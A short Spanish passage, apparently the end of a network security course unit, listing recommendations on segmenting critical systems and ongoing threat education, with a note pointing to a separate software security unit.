5. **Segmentación efectiva**: Aislamiento de sistemas críticos de red
6. **Educación continua**: Conocimiento actualizado de amenazas de red

**Nota importante:** Este análisis se centra exclusivamente en aspectos de seguridad de red e infraestructura. Para análisis de seguridad de aplicaciones y software, ver unidad de seguridad en software.
